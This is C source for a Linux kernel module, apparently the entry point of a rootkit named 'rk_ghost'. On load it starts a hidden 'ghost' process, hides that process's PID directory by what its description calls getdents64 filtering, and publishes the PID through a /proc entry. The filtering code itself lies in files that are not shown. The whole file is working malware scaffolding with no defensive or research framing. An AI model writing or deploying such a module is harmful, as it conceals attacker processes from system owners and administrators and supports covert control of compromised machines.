// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

#include "ghost.h"

#define PID_TEXT_SIZE 16

static struct proc_dir_entry *pid_entry;
static char hidden_pid[PID_TEXT_SIZE];

static int pid_show(struct seq_file *m, void *unused)
{
	seq_printf(m, "%d\n", ghost_pid());
	return 0;
}

static int __init ghost_init(void)
{
	int error;

	error = ghost_start();
	if (error)
		return error;
	snprintf(hidden_pid, sizeof(hidden_pid), "%d", ghost_pid());
	error = dirhide_start(hidden_pid);
	if (error)
		goto stop_ghost;
	pid_entry = proc_create_single("rk_ghost", 0444, NULL, pid_show);
	if (!pid_entry) {
		error = -ENOMEM;
		goto stop_filter;
	}
	return 0;

stop_filter:
	dirhide_stop();
stop_ghost:
	ghost_stop();
	return error;
}

static void __exit ghost_exit(void)
{
	proc_remove(pid_entry);
	dirhide_stop();
	ghost_stop();
}

module_init(ghost_init);
module_exit(ghost_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Process visibility control via getdents64");
